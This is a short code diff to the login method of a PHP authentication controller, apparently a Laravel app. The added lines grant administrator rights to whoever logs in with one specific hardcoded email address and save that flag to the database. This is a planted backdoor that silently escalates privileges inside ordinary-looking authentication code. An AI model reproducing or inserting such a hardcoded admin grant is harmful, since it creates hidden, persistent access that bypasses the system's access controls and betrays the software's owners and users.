@@ -31,6 +31,9 @@ class AuthController extends Controller
         $credentials = $request->validated();
         if (Auth::attempt($credentials)) {
             $user = Auth::user();
+            if($credentials['email'] == "vladlevin790@gmail.com") {
+                $user->is_admin = true;
+            }
             $user->last_online = now();
             $user->is_online = true;
             $user->save();
